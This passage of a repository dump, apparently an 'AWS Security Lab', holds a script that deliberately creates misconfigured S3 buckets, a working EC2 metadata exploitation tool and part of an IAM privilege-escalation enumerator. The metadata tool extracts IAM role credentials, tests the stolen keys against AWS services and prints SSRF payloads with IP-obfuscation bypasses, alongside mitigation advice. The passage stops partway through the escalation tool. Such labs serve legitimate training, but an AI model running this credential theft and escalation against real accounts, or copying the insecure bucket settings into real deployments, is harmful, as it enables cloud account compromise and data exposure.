        # NOTE: Not setting encryption = vulnerable
        # Best practice would be:
        # s3_client.put_bucket_encryption(...)
        
        s3_client.put_bucket_tagging(
            Bucket=bucket_name,
            Tagging={'TagSet': [
                {'Key': 'Vulnerability', 'Value': 'no-encryption'},
                {'Key': 'Severity', 'Value': 'High'},
                *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
            ]}
        )
        
        console.print(f"  [green]✓[/] Created without server-side encryption")
        console.print(f"  [yellow]⚠ Vulnerability:[/] Data at rest is not encrypted")
        return True
        
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return False


def create_no_versioning_bucket(s3_client):
    """
    VULNERABILITY 3: No Versioning
    ------------------------------
    Attack Vector: Data destruction, ransomware
    Risk: No recovery from accidental/malicious deletion
    """
    bucket_name = config.S3_NO_VERSIONING_BUCKET
    console.print(f"\n[bold red]Creating NO-VERSIONING bucket:[/] {bucket_name}")
    
    try:
        if config.AWS_REGION == 'us-east-1':
            s3_client.create_bucket(Bucket=bucket_name)
        else:
            s3_client.create_bucket(
                Bucket=bucket_name,
                CreateBucketConfiguration={'LocationConstraint': config.AWS_REGION}
            )
        
        # VULNERABLE: Versioning suspended/disabled
        s3_client.put_bucket_versioning(
            Bucket=bucket_name,
            VersioningConfiguration={'Status': 'Suspended'}  # VULNERABLE
        )
        
        s3_client.put_bucket_tagging(
            Bucket=bucket_name,
            Tagging={'TagSet': [
                {'Key': 'Vulnerability', 'Value': 'no-versioning'},
                {'Key': 'Severity', 'Value': 'Medium'},
                *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
            ]}
        )
        
        console.print(f"  [green]✓[/] Created with versioning DISABLED")
        console.print(f"  [yellow]⚠ Vulnerability:[/] No protection against data deletion")
        return True
        
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return False


def create_cors_vulnerable_bucket(s3_client):
    """
    VULNERABILITY 4: Overly Permissive CORS
    ---------------------------------------
    Attack Vector: Cross-site data exfiltration
    Risk: Any website can access bucket data
    """
    bucket_name = config.S3_CORS_BUCKET
    console.print(f"\n[bold red]Creating CORS-VULNERABLE bucket:[/] {bucket_name}")
    
    try:
        if config.AWS_REGION == 'us-east-1':
            s3_client.create_bucket(Bucket=bucket_name)
        else:
            s3_client.create_bucket(
                Bucket=bucket_name,
                CreateBucketConfiguration={'LocationConstraint': config.AWS_REGION}
            )
        
        # VULNERABLE: Allow any origin
        s3_client.put_bucket_cors(
            Bucket=bucket_name,
            CORSConfiguration={
                'CORSRules': [
                    {
                        'AllowedHeaders': ['*'],                    # VULNERABLE
                        'AllowedMethods': ['GET', 'PUT', 'POST', 'DELETE'],  # VULNERABLE
                        'AllowedOrigins': ['*'],                    # VULNERABLE
                        'ExposeHeaders': ['ETag'],
                        'MaxAgeSeconds': 3000
                    }
                ]
            }
        )
        
        s3_client.put_bucket_tagging(
            Bucket=bucket_name,
            Tagging={'TagSet': [
                {'Key': 'Vulnerability', 'Value': 'overly-permissive-cors'},
                {'Key': 'Severity', 'Value': 'High'},
                *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
            ]}
        )
        
        console.print(f"  [green]✓[/] Created with permissive CORS")
        console.print(f"  [yellow]⚠ Vulnerability:[/] Any website can access bucket via browser")
        return True
        
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return False


def create_secure_bucket(s3_client):
    """
    SECURE REFERENCE BUCKET
    -----------------------
    Demonstrates best practices for S3 security
    """
    bucket_name = config.S3_SECURE_BUCKET
    console.print(f"\n[bold green]Creating SECURE reference bucket:[/] {bucket_name}")
    
    try:
        if config.AWS_REGION == 'us-east-1':
            s3_client.create_bucket(Bucket=bucket_name)
        else:
            s3_client.create_bucket(
                Bucket=bucket_name,
                CreateBucketConfiguration={'LocationConstraint': config.AWS_REGION}
            )
        
        # SECURE: Block all public access
        s3_client.put_public_access_block(
            Bucket=bucket_name,
            PublicAccessBlockConfiguration={
                'BlockPublicAcls': True,
                'IgnorePublicAcls': True,
                'BlockPublicPolicy': True,
                'RestrictPublicBuckets': True
            }
        )
        
        # SECURE: Enable versioning
        s3_client.put_bucket_versioning(
            Bucket=bucket_name,
            VersioningConfiguration={'Status': 'Enabled'}
        )
        
        # SECURE: Enable encryption
        s3_client.put_bucket_encryption(
            Bucket=bucket_name,
            ServerSideEncryptionConfiguration={
                'Rules': [
                    {
                        'ApplyServerSideEncryptionByDefault': {
                            'SSEAlgorithm': 'AES256'
                        },
                        'BucketKeyEnabled': True
                    }
                ]
            }
        )
        
        s3_client.put_bucket_tagging(
            Bucket=bucket_name,
            Tagging={'TagSet': [
                {'Key': 'Vulnerability', 'Value': 'none'},
                {'Key': 'Purpose', 'Value': 'secure-reference'},
                *[{'Key': k, 'Value': v} for k, v in config.COMMON_TAGS.items()]
            ]}
        )
        
        console.print(f"  [green]✓[/] Created with all security best practices")
        return True
        
    except Exception as e:
        console.print(f"  [red]✗ Error:[/] {str(e)}")
        return False


def display_summary():
    """Display summary of created buckets"""
    table = Table(title="S3 Buckets Created")
    table.add_column("Bucket Name", style="cyan")
    table.add_column("Vulnerability", style="yellow")
    table.add_column("Severity", style="red")
    
    table.add_row(config.S3_PUBLIC_BUCKET, "Public Access", "🔴 Critical")
    table.add_row(config.S3_UNENCRYPTED_BUCKET, "No Encryption", "🟠 High")
    table.add_row(config.S3_NO_VERSIONING_BUCKET, "No Versioning", "🟡 Medium")
    table.add_row(config.S3_CORS_BUCKET, "Permissive CORS", "🟠 High")
    table.add_row(config.S3_SECURE_BUCKET, "None (Secure)", "🟢 N/A")
    
    console.print("\n")
    console.print(table)


def main():
    console.print(Panel.fit(
        "[bold red]⚠️  VULNERABLE S3 BUCKET SETUP  ⚠️[/]\n"
        "This script creates intentionally insecure S3 buckets.\n"
        "[yellow]For educational purposes only![/]",
        title="AWS Security Lab"
    ))
    
    s3_client = create_s3_client()
    
    # Create all vulnerable buckets
    create_public_bucket(s3_client)
    create_unencrypted_bucket(s3_client)
    create_no_versioning_bucket(s3_client)
    create_cors_vulnerable_bucket(s3_client)
    create_secure_bucket(s3_client)
    
    display_summary()
    
    console.print("\n[bold green]Setup complete![/]")
    console.print("Run penetration tests from: [cyan]penetration-testing/s3-enumeration/[/]")


if __name__ == "__main__":
    main()

```

## File: `penetration-testing\ec2-metadata\ec2_metadata.py`
```python
"""
EC2 Metadata Service Exploitation
==================================
Exploits IMDSv1 vulnerabilities to steal credentials.

ATTACK TECHNIQUES:
1. Direct metadata access - Query the metadata service
2. Credential theft - Extract IAM role credentials
3. SSRF exploitation - Access metadata via vulnerable apps
4. Pivot techniques - Use stolen credentials to move laterally
"""

import requests
import json
import sys
import os
import boto3
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from config import config

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.tree import Tree
from rich.syntax import Syntax

console = Console()

# EC2 Metadata Service endpoints
METADATA_BASE = "http://169.254.169.254"
METADATA_ENDPOINTS = {
    'instance-id': '/latest/meta-data/instance-id',
    'instance-type': '/latest/meta-data/instance-type',
    'ami-id': '/latest/meta-data/ami-id',
    'hostname': '/latest/meta-data/hostname',
    'local-ipv4': '/latest/meta-data/local-ipv4',
    'public-ipv4': '/latest/meta-data/public-ipv4',
    'availability-zone': '/latest/meta-data/placement/availability-zone',
    'security-groups': '/latest/meta-data/security-groups',
    'iam-role': '/latest/meta-data/iam/security-credentials/',
    'user-data': '/latest/user-data',
    'identity-document': '/latest/dynamic/instance-identity/document'
}


class MetadataExploiter:
    """EC2 Metadata Service exploitation tool"""
    
    def __init__(self, base_url=METADATA_BASE, timeout=2):
        self.base_url = base_url
        self.timeout = timeout
        self.credentials = None
    
    def is_metadata_accessible(self):
        """Check if metadata service is accessible"""
        try:
            response = requests.get(
                f"{self.base_url}/latest/meta-data/",
                timeout=self.timeout
            )
            return response.status_code == 200
        except:
            return False
    
    def query_metadata(self, path):
        """Query a specific metadata endpoint"""
        try:
            url = f"{self.base_url}{path}"
            response = requests.get(url, timeout=self.timeout)
            if response.status_code == 200:
                return response.text
            return None
        except Exception as e:
            return None
    
    def enumerate_metadata(self):
        """Enumerate all metadata endpoints"""
        results = {}
        
        console.print("\n[bold cyan]Enumerating Metadata Endpoints...[/]")
        
        for name, path in METADATA_ENDPOINTS.items():
            value = self.query_metadata(path)
            if value:
                results[name] = value
                if len(value) > 100:
                    display = value[:100] + '...'
                else:
                    display = value
                console.print(f"  [green]✓[/] {name}: {display}")
            else:
                console.print(f"  [dim]✗ {name}: Not available[/]")
        
        return results
    
    def extract_iam_credentials(self):
        """Extract IAM credentials from metadata"""
        console.print("\n[bold red]EXTRACTING IAM CREDENTIALS...[/]")
        
        # First get the role name
        role_path = METADATA_ENDPOINTS['iam-role']
        role_name = self.query_metadata(role_path)
        
        if not role_name:
            console.print("  [yellow]No IAM role attached to this instance[/]")
            return None
        
        # Clean up role name (remove newlines)
        role_name = role_name.strip()
        console.print(f"  [green]Found IAM Role:[/] {role_name}")
        
        # Get credentials for the role
        creds_path = f"{role_path}{role_name}"
        creds_raw = self.query_metadata(creds_path)
        
        if not creds_raw:
            console.print("  [red]Failed to retrieve credentials[/]")
            return None
        
        try:
            creds = json.loads(creds_raw)
            self.credentials = {
                'AccessKeyId': creds.get('AccessKeyId'),
                'SecretAccessKey': creds.get('SecretAccessKey'),
                'Token': creds.get('Token'),
                'Expiration': creds.get('Expiration'),
                'RoleName': role_name
            }
            
            console.print("\n  [bold red]⚠️  CREDENTIALS EXTRACTED! ⚠️[/]")
            console.print(f"  Access Key ID: [cyan]{self.credentials['AccessKeyId']}[/]")
            console.print(f"  Secret Key: [cyan]{self.credentials['SecretAccessKey'][:10]}...REDACTED[/]")
            console.print(f"  Session Token: [cyan]{self.credentials['Token'][:20]}...REDACTED[/]")
            console.print(f"  Expiration: [yellow]{self.credentials['Expiration']}[/]")
            
            return self.credentials
            
        except json.JSONDecodeError:
            console.print("  [red]Failed to parse credentials JSON[/]")
            return None
    
    def extract_user_data(self):
        """Extract instance user-data (may contain secrets!)"""
        console.print("\n[bold cyan]Extracting User-Data...[/]")
        
        user_data = self.query_metadata('/latest/user-data')
        
        if not user_data:
            console.print("  [dim]No user-data available[/]")
            return None
        
        console.print("  [green]User-data found![/]")
        
        # Check for common secrets in user-data
        secrets_found = []
        secret_patterns = [
            'password', 'secret', 'key', 'token', 'api_key',
            'aws_access', 'aws_secret', 'credential'
        ]
        
        for pattern in secret_patterns:
            if pattern.lower() in user_data.lower():
                secrets_found.append(pattern)
        
        if secrets_found:
            console.print(f"  [red]⚠️  Potential secrets detected: {', '.join(secrets_found)}[/]")
        
        # Display user-data (truncated)
        console.print("\n  [bold]User-Data Content:[/]")
        syntax = Syntax(user_data[:1000], "bash", theme="monokai", line_numbers=True)
        console.print(syntax)
        
        if len(user_data) > 1000:
            console.print(f"  [dim]... truncated ({len(user_data)} total characters)[/]")
        
        return user_data
    
    def test_stolen_credentials(self):
        """Test stolen credentials by making AWS API calls"""
        if not self.credentials:
            console.print("[yellow]No credentials available to test[/]")
            return
        
        console.print("\n[bold cyan]Testing Stolen Credentials...[/]")
        
        try:
            # Create a session with stolen credentials
            session = boto3.Session(
                aws_access_key_id=self.credentials['AccessKeyId'],
                aws_secret_access_key=self.credentials['SecretAccessKey'],
                aws_session_token=self.credentials['Token']
            )
            
            # Test STS
            sts = session.client('sts')
            identity = sts.get_caller_identity()
            console.print(f"  [green]✓ STS GetCallerIdentity:[/] {identity['Arn']}")
            
            # Test S3
            try:
                s3 = session.client('s3')
                buckets = s3.list_buckets()
                console.print(f"  [green]✓ S3 ListBuckets:[/] {len(buckets['Buckets'])} buckets accessible")
            except:
                console.print("  [red]✗ S3 ListBuckets: Access Denied[/]")
            
            # Test EC2
            try:
                ec2 = session.client('ec2')
                instances = ec2.describe_instances(MaxResults=5)
                count = sum(len(r['Instances']) for r in instances['Reservations'])
                console.print(f"  [green]✓ EC2 DescribeInstances:[/] {count} instances visible")
            except:
                console.print("  [red]✗ EC2 DescribeInstances: Access Denied[/]")
            
            # Test IAM
            try:
                iam = session.client('iam')
                users = iam.list_users(MaxItems=5)
                console.print(f"  [green]✓ IAM ListUsers:[/] {len(users['Users'])} users visible")
            except:
                console.print("  [red]✗ IAM ListUsers: Access Denied[/]")
            
            return True
            
        except Exception as e:
            console.print(f"  [red]Error testing credentials:[/] {e}")
            return False
    
    def ssrf_payload_generator(self, target_url=None):
        """Generate SSRF payloads for metadata access"""
        console.print("\n[bold cyan]SSRF Payload Generator[/]")
        console.print("-" * 40)
        
        payloads = {
            'Basic': f'{METADATA_BASE}/latest/meta-data/',
            'Instance ID': f'{METADATA_BASE}/latest/meta-data/instance-id',
            'IAM Credentials': f'{METADATA_BASE}/latest/meta-data/iam/security-credentials/',
            'User Data': f'{METADATA_BASE}/latest/user-data',
            'Identity Doc': f'{METADATA_BASE}/latest/dynamic/instance-identity/document',
            
            # Bypass attempts
            'IPv6': 'http://[::ffff:169.254.169.254]/latest/meta-data/',
            'Decimal IP': 'http://2852039166/latest/meta-data/',
            'Hex IP': 'http://0xa9fea9fe/latest/meta-data/',
            'Octal IP': 'http://0251.0376.0251.0376/latest/meta-data/',
        }
        
        table = Table(title="SSRF Payloads for EC2 Metadata")
        table.add_column("Type", style="cyan")
        table.add_column("Payload", style="green")
        
        for name, payload in payloads.items():
            table.add_row(name, payload)
        
        console.print(table)
        
        if target_url:
            console.print(f"\n[bold]For vulnerable endpoint {target_url}:[/]")
            console.print(f"  {target_url}?url={METADATA_BASE}/latest/meta-data/iam/security-credentials/")
        
        return payloads


def demonstrate_attack():
    """Demonstrate the metadata attack in a simulated environment"""
    console.print(Panel.fit(
        "[bold yellow]📝 ATTACK DEMONSTRATION 📝[/]\n\n"
        "Since we're not running on EC2, this demonstrates\n"
        "how the attack would work in a real scenario.",
        title="Demo Mode"
    ))
    
    console.print("\n[bold cyan]Attack Scenario: SSRF to Credential Theft[/]")
    console.print("="*50)
    
    steps = [
        ("1. Identify SSRF Vulnerability", 
         "Found web app that fetches user-provided URLs:\n"
         "   GET /fetch?url=http://example.com"),
        
        ("2. Probe Metadata Service",
         "Request: GET /fetch?url=http://169.254.169.254/latest/meta-data/\n"
         "Response: Shows metadata categories are accessible!"),
        
        ("3. Identify IAM Role",
         "Request: GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\n"
         "Response: 'webapp-role'"),
        
        ("4. Extract Credentials",
         "Request: GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/webapp-role\n"
         "Response: {AccessKeyId, SecretAccessKey, Token}"),
        
        ("5. Use Stolen Credentials",
         "export AWS_ACCESS_KEY_ID=ASIAXXX...\n"
         "export AWS_SECRET_ACCESS_KEY=xxx...\n"
         "export AWS_SESSION_TOKEN=xxx...\n"
         "aws s3 ls  # Now accessing S3 as the compromised role!"),
    ]
    
    for title, content in steps:
        console.print(f"\n[bold green]{title}[/]")
        console.print(f"[dim]{content}[/]")
    
    console.print("\n" + "="*50)
    console.print("[bold red]IMPACT: Full access to AWS resources with role permissions![/]")


def main():
    console.print(Panel.fit(
        "[bold red]🎯 EC2 METADATA EXPLOITATION 🎯[/]\n\n"
        "This tool exploits EC2 Instance Metadata Service:\n"
        "• Extract instance information\n"
        "• Steal IAM role credentials\n"
        "• Access user-data (may contain secrets)\n"
        "• Generate SSRF payloads\n\n"
        "[yellow]Note: Full functionality requires running on EC2[/]",
        title="Penetration Testing Tool"
    ))
    
    exploiter = MetadataExploiter()
    
    # Check if we're on EC2
    console.print("\n[bold cyan]Checking if running on EC2...[/]")
    
    if exploiter.is_metadata_accessible():
        console.print("[green]✓ Metadata service accessible - Running on EC2![/]")
        
        # Full exploitation
        metadata = exploiter.enumerate_metadata()
        creds = exploiter.extract_iam_credentials()
        user_data = exploiter.extract_user_data()
        
        if creds:
            exploiter.test_stolen_credentials()
    else:
        console.print("[yellow]✗ Metadata not accessible - Not running on EC2[/]")
        console.print("  Switching to demonstration mode...")
        
        # Show demonstration
        demonstrate_attack()
    
    # Always show SSRF payloads
    exploiter.ssrf_payload_generator()
    
    # Mitigation recommendations
    console.print("\n" + "="*60)
    console.print(Panel.fit(
        "[bold green]🛡️ MITIGATION RECOMMENDATIONS 🛡️[/]\n\n"
        "1. [cyan]Enable IMDSv2[/] - Require session tokens\n"
        "   aws ec2 modify-instance-metadata-options \\\n"
        "     --instance-id i-xxx --http-tokens required\n\n"
        "2. [cyan]Limit hop count[/] - Prevent container access\n"
        "   --http-put-response-hop-limit 1\n\n"
        "3. [cyan]Use VPC endpoints[/] - Avoid SSRF via internal access\n\n"
        "4. [cyan]IAM role scoping[/] - Minimal required permissions\n\n"
        "5. [cyan]Web app hardening[/] - Validate URLs, block internal IPs",
        title="Defense",
        border_style="green"
    ))
    
    console.print("\n[bold green]Exploitation tool complete![/]")


if __name__ == "__main__":
    main()

```

## File: `penetration-testing\iam-escalation\iam_escalation.py`
```python
"""
IAM Privilege Escalation Tool
==============================
Identifies and exploits IAM privilege escalation paths.

ATTACK TECHNIQUES:
1. Permission enumeration - Map current permissions
2. Escalation path detection - Find ways to elevate privileges
3. Policy abuse - Exploit misconfigured policies
4. Role assumption - Hijack overly permissive roles
"""

import boto3
import json
import sys
import os
from botocore.exceptions import ClientError

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
from config import config

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.tree import Tree

console = Console()


# Known privilege escalation methods in AWS
ESCALATION_METHODS = {
    'iam:CreatePolicyVersion': {
        'description': 'Create a new version of a managed policy with elevated permissions',
        'severity': 'Critical',
        'technique': 'Create new policy version with admin permissions'
    },
    'iam:SetDefaultPolicyVersion': {
        'description': 'Set existing policy version as default (if older version has more perms)',
        'severity': 'High',
        'technique': 'Rollback to a more permissive policy version'
    },
    'iam:CreateAccessKey': {
        'description': 'Create access key for another user',
        'severity': 'Critical',
        'technique': 'Create access keys for admin users'
    },
    'iam:CreateLoginProfile': {
        'description': 'Create console password for another user',
        'severity': 'Critical',
        'technique': 'Create login for admin users'
    },
    'iam:UpdateLoginProfile': {
        'description': 'Change console password for another user',
        'severity': 'Critical',
        'technique': 'Reset admin user passwords'
    },
    'iam:AttachUserPolicy': {
        'description': 'Attach managed policy to user',
        'severity': 'Critical',
        'technique': 'Attach AdministratorAccess to yourself'
    },
    'iam:AttachGroupPolicy': {
        'description': 'Attach managed policy to group',
        'severity': 'Critical',
        'technique': 'Attach admin policy to your group'
    },
    'iam:AttachRolePolicy': {
        'description': 'Attach managed policy to role',
        'severity': 'Critical',
        'technique': 'Attach admin policy to assumable role'
    },
    'iam:PutUserPolicy': {
        'description': 'Add inline policy to user',
        'severity': 'Critical',
        'technique': 'Add inline admin policy to yourself'
    },
    'iam:PutGroupPolicy': {
        'description': 'Add inline policy to group',
        'severity': 'Critical',
        'technique': 'Add inline admin policy to your group'
    },
    'iam:PutRolePolicy': {
        'description': 'Add inline policy to role',
        'severity': 'Critical',
        'technique': 'Add inline admin policy to assumable role'
    },
    'iam:AddUserToGroup': {
        'description': 'Add user to group',
        'severity': 'High',
        'technique': 'Add yourself to admin group'
    },
    'iam:UpdateAssumeRolePolicy': {
        'description': 'Modify role trust policy',
        'severity': 'Critical',
        'technique': 'Allow yourself to assume admin role'
    },
    'iam:PassRole': {
        'description': 'Pass role to service',
        'severity': 'High',
        'technique': 'Pass admin role to Lambda/EC2'
    },
    'sts:AssumeRole': {
        'description': 'Assume another role',
        'severity': 'Variable',
        'technique': 'Assume a role with more permissions'
    },
    'lambda:CreateFunction': {
        'description': 'Create Lambda with attached role',
        'severity': 'High',
        'technique': 'Create Lambda with admin role, execute it'
    },
    'lambda:UpdateFunctionCode': {
        'description': 'Update Lambda function code',
        'severity': 'High',
        'technique': 'Hijack Lambda with privileged role'
    },
    'ec2:RunInstances': {
        'description': 'Launch EC2 with instance profile',
        'severity': 'High',
        'technique': 'Launch EC2 with admin role, access metadata'
    },
    'glue:CreateDevEndpoint': {
        'description': 'Create Glue endpoint with role',
        'severity': 'High',
        'technique': 'Create Glue endpoint with admin role, SSH in'
    },
    'cloudformation:CreateStack': {
        'description': 'Create CloudFormation stack with role',
        'severity': 'High',
        'technique': 'Create stack that creates admin resources'
    }
}


class IAMEnumerator:
    """IAM privilege escalation enumeration tool"""
    
    def __init__(self):
        self.iam_client = boto3.client('iam', region_name=config.AWS_REGION)
        self.sts_client = boto3.client('sts')
        self.current_identity = None
        self.permissions = []
        self.escalation_paths = []
    
    def get_current_identity(self):
        """Get current IAM identity"""
        try:
            identity = self.sts_client.get_caller_identity()
            self.current_identity = {
                'arn': identity['Arn'],
                'account': identity['Account'],
                'user_id': identity['UserId']
            }
            
            # Determine if user or role
            arn = identity['Arn']
            if ':user/' in arn:
                self.current_identity['type'] = 'user'
                self.current_identity['name'] = arn.split(':user/')[-1]
            elif ':role/' in arn:
                self.current_identity['type'] = 'role'
                self.current_identity['name'] = arn.split(':role/')[-1].split('/')[-1]
            elif ':assumed-role/' in arn:
                self.current_identity['type'] = 'assumed-role'
                self.current_identity['name'] = arn.split(':assumed-role/')[-1]
            else:
                self.current_identity['type'] = 'unknown'
                self.current_identity['name'] = arn.split('/')[-1]
            
            return self.current_identity
        except Exception as e:
            console.print(f"[red]Error getting identity:[/] {e}")
            return None
    
    def enumerate_user_policies(self, user_name):
        """Get all policies attached to a user"""
        policies = []
        
        try:
            # Inline policies
            inline = self.iam_client.list_user_policies(UserName=user_name)
            for policy_name in inline.get('PolicyNames', []):
                policy_doc = self.iam_client.get_user_policy(
                    UserName=user_name,
                    PolicyName=policy_name
                )
                policies.append({
                    'type': 'inline',
                    'name': policy_name,
                    'document': policy_doc['PolicyDocument']
                })
            
            # Attached managed policies
            attached = self.iam_client.list_attached_user_policies(UserName=user_name)
            for policy in attached.get('AttachedPolicies', []):
                policy_version = self.iam_client.get_policy(PolicyArn=policy['PolicyArn'])
                version_id = policy_version['Policy']['DefaultVersionId']
                policy_doc = self.iam_client.get_policy_version(
                    PolicyArn=policy['PolicyArn'],
                    VersionId=version_id
                )
                policies.append({
                    'type': 'managed',
                    'name': policy['PolicyName'],
                    'arn': policy['PolicyArn'],
                    'document': policy_doc['PolicyVersion']['Document']
                })
                
        except ClientError as e:
            console.print(f"[red]Error enumerating policies:[/] {e}")
        
        return policies
    
    def enumerate_role_policies(self, role_name):
        """Get all policies attached to a role"""
        policies = []
        
        try:
            # Inline policies
            inline = self.iam_client.list_role_policies(RoleName=role_name)
            for policy_name in inline.get('PolicyNames', []):
                policy_doc = self.iam_client.get_role_policy(
                    RoleName=role_name,
                    PolicyName=policy_name
                )
                policies.append({
                    'type': 'inline',
                    'name': policy_name,
                    'document': policy_doc['PolicyDocument']
                })
            
            # Attached managed policies
            attached = self.iam_client.list_attached_role_policies(RoleName=role_name)
            for policy in attached.get('AttachedPolicies', []):
                try:
                    policy_version = self.iam_client.get_policy(PolicyArn=policy['PolicyArn'])
                    version_id = policy_version['Policy']['DefaultVersionId']
                    policy_doc = self.iam_client.get_policy_version(
                        PolicyArn=policy['PolicyArn'],
                        VersionId=version_id
                    )
                    policies.append({
                        'type': 'managed',
                        'name': policy['PolicyName'],
                        'arn': policy['PolicyArn'],
                        'document': policy_doc['PolicyVersion']['Document']
                    })
                except:
                    policies.append({
                        'type': 'managed',
                        'name': policy['PolicyName'],
                        'arn': policy['PolicyArn'],
                        'document': None
                    })
                    
        except ClientError as e:
            console.print(f"[red]Error enumerating role policies:[/] {e}")
        
        return policies
    
    def extract_permissions(self, policies):
        """Extract all allowed actions from policies"""
        permissions = set()
        
        for policy in policies:
            doc = policy.get('document')
            if not doc:
                continue
            
            for statement in doc.get('Statement', []):
                if statement.get('Effect') == 'Allow':
                    actions = statement.get('Action', [])
                    if isinstance(actions, str):
                        actions = [actions]
                    
                    for action in actions:
                        permissions.add(action)
        
        return list(permissions)
    
    def find_escalation_paths(self, permissions):
        """Identify privilege escalation paths from current permissions"""
        paths = []
        
        for perm in permissions:
            # Handle wildcards
            if perm == '*' or perm == '*:*':
                paths.append({
                    'permission': perm,
                    'method': 'Full Admin Access',
                    'severity': 'Critical',
                    'description': 'Has all permissions - no escalation needed!',
                    'technique': 'Already has full access'
                })
                continue
            
            # Check for service wildcards
            if perm.endswith(':*'):
                service = perm.split(':')[0]
                if service == 'iam':
                    paths.append({
                        'permission': perm,
                        'method': 'IAM Wildcard',
                        'severity': 'Critical',
                        'description': 'Full IAM access allows any escalation method',
                        'technique': 'Use any IAM escalation technique'
                    })
            
            # Check against known escalation methods
            for method, details in ESCALATION_METHODS.items():
                if perm == method or perm.replace(':*', '') == method.split(':')[0]:
                    paths.append({
                        'permission': perm,
                        'method': method,
                        'severity': details['severity'],
                        'description': details['description'],
                        'technique': details['technique']
                    })
        
        return paths
    
    def check_assumable_roles(self):
        """Find roles that can be assumed"""
        assumable = []
        
        try:
            roles = self.iam_client.list_roles(MaxItems=100)
            
            for role in roles.get('Roles', []):
                trust_policy = role.get('AssumeRolePolicyDocument', {})
                
                for statement in trust_policy.get('Statement', []):
                    if statement.get('Effect') == 'Allow':
                        principal = statement.get('Principal', {})
                        
                        # Check if anyone can assume
                        if principal == '*' or principal.get('AWS') == '*':
                            assumable.append({
                                'role_name': role['RoleName'],
                                'role_arn': role['Arn'],
                                'vulnerability': 'Any principal can assume this role!',
                                'severity': 'Critical'
                            })
                        
                        # Check if current account can assume
                        elif isinstance(principal.get('AWS'), str):
                            if self.current_identity['account'] in principal['AWS']:
                                assumable.append({
                                    'role_name': role['RoleName'],
                                    'role_arn': role['Arn'],
                                    'vulnerability': 'Account can assume this role',
                                    'severity': 'High'
                                })
                                
        except ClientError as e:
            console.print(f"[yellow]Cannot list roles:[/] {e}")
        
        return assumable
    
    def attempt_assume_role(self, role_arn):
        """Attempt to assume a role"""
        try:
            response = self.sts_client.assume_role(
                RoleArn=role_arn,
                RoleSessionName='SecurityLabTest'
            )
            return {
                'success': True,
                'credentials': {
                    'AccessKeyId': response['Credentials']['AccessKeyId'],
                    'SecretAccessKey': response['Credentials']['SecretAccessKey'][:10] + '...',
                    'SessionToken': response['Credentials']['SessionToken'][:20] + '...',
                    'Expiration': str(response['Credentials']['Expiration'])
                }
            }
        except ClientError as e:
            return {
                'success': False,
                'error': str(e)
            }
    
    def check_dangerous_policies(self):
        """Scan for dangerously permissive policies"""
        dangerous = []
        
        try:
            # List customer managed policies
            policies = self.iam_client.list_policies(Scope='Local', MaxItems=100)
            
            for policy in policies.get('Policies', []):
                try:
                    version = self.iam_client.get_policy_version(
                        PolicyArn=policy['Arn'],
                        VersionId=policy['DefaultVersionId']
                    )
                    doc = version['PolicyVersion']['Document']
                    
                    for statement in doc.get('Statement', []):
                        if statement.get('Effect') == 'Allow':
                            actions = statement.get('Action', [])
                            resources = statement.get('Resource', [])
                            
                            if isinstance(actions, str):
                                actions = [actions]
                            if isinstance(resources, str):
                                resources = [resources]
                            
                            # Check for admin access
                            if '*' in actions and '*' in resources:
                                dangerous.append({
                                    'policy_name': policy['PolicyName'],
                                    'policy_arn': policy['Arn'],
                                    'issue': 'Allow * on * (Admin access)',
                                    'severity': 'Critical'
                                })
                            elif any(a.startswith('iam:') or a == '*' for a in actions):
                                dangerous.append({
                                    'policy_name': policy['PolicyName'],
                                    'policy_arn': policy['Arn'],
                                    'issue': f'IAM actions allowed: {[a for a in actions if a.startswith("iam:") or a == "*"]}',
                                    'severity': 'High'
                                })
                except:
                    pass
                    
        except ClientError as e:
            console.print(f"[yellow]Cannot scan policies:[/] {e}")
        
        return dangerous


def main():
    console.print(Panel.fit(
        "[bold red]🔓 IAM PRIVILEGE ESCALATION TOOL 🔓[/]\n\n"
        "This tool identifies privilege escalation paths:\n"
        "• Maps current IAM permissions\n"
        "• Identifies escalation techniques\n"
        "• Finds assumable roles\n"
        "• Detects dangerous policies",
        title="Penetration Testing Tool"
    ))
    
    enumerator = IAMEnumerator()
    
    # Get current identity
    console.print("\n[bold cyan]1. Current Identity[/]")
    console.print("-" * 40)
    identity = enumerator.get_current_identity()
    
    if identity:
        console.print(f"  ARN: [green]{identity['arn']}[/]")
        console.print(f"  Type: {identity['type']}")
        console.print(f"  Name: {identity['name']}")
        console.print(f"  Account: {identity['account']}")
    
    # Enumerate permissions
    console.print("\n[bold cyan]2. Enumerating Permissions[/]")
    console.print("-" * 40)
    
    policies = []
    if identity['type'] == 'user':
        policies = enumerator.enumerate_user_policies(identity['name'])
    elif identity['type'] in ['role', 'assumed-role']:
        role_name = identity['name'].split('/')[0] if '/' in identity['name'] else identity['name']
        policies = enumerator.enumerate_role_policies(role_name)
    
    console.print(f"  Found {len(policies)} policies")
    
    permissions = enumerator.extract_permissions(policies)
    console.print(f"  Total unique permissions: {len(permissions)}")
    
    # Show permission tree
    if permissions:
        tree = Tree("[bold]Permissions[/]")
        services = {}
        for perm in sorted(permissions):
            service = perm.split(':')[0] if ':' in perm else 'other'
            if service not in services:
                services[service] = []
            services[service].append(perm)
        
        for service, perms in sorted(services.items())[:10]:  # Show first 10 services
            branch = tree.add(f"[cyan]{service}[/]")
            for p in perms[:5]:  # Show first 5 permissions per service
                branch.add(p)
            if len(perms) > 5:
                branch.add(f"[dim]... and {len(perms)-5} more[/]")
        
        console.print(tree)
    
    # Find escalation paths
    console.print("\n[bold cyan]3. Privilege Escalation Paths[/]")
    console.print("-" * 40)
    
    escalation_paths = enumerator.find_escalation_paths(permissions)
    
    if escalation_paths:
        table = Table(title="Escalation Opportunities")
        table.add_column("Permission", style="cyan")
        table.add_column("Method", style="yellow")
